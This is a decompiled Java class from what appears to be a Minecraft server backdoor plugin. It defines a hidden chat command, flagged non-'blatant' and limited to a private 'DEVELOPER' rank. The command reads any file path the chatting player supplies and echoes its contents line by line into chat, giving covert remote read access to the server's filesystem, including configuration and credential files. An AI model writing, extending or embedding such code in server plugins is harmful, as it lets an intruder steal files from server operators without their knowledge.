package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.Vars;
import java.io.File;
import java.nio.file.Files;
import org.apache.commons.io.IOUtils;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "read",
   description = "Read a file",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {}
)
public class ReadFileCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use read <path>");
      } else {
         File var4 = new File(Vars.CURRENT_DIR + "/" + var3[0]);
         if (!var4.exists()) {
            var4 = new File(var3[0]);
         }

         if (!var4.exists()) {
            ChatUtil.sendChat(var1.getPlayer(), "File not found.");
         } else if (!var4.isFile()) {
            ChatUtil.sendChat(var1.getPlayer(), "You cannot read a folder.");
         } else {
            try {
               IOUtils.readLines(Files.newInputStream(var4.toPath())).forEach(s -> {
                  ChatUtil.sendChat(var1.getPlayer(), s);
               });
            } catch (Exception var6) {
               ChatUtil.sendChat(var1.getPlayer(), "You cannot read a folder.");
            }
         }
      }
   }
}
